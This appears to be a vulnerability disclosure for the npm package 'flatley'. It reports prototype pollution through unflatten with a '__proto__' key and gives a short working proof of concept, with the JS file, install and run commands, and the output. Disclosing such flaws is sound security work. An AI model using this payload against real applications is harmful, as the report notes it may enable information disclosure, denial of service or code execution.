# Description

`flatley` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior using a `__proto__` payload, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var {unflatten} = require("flatley")
unflatten({'__proto__.polluted': true});
console.log(polluted); 
```

2. Execute the following commands in another terminal:

```bash
npm i flatley # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
true
```
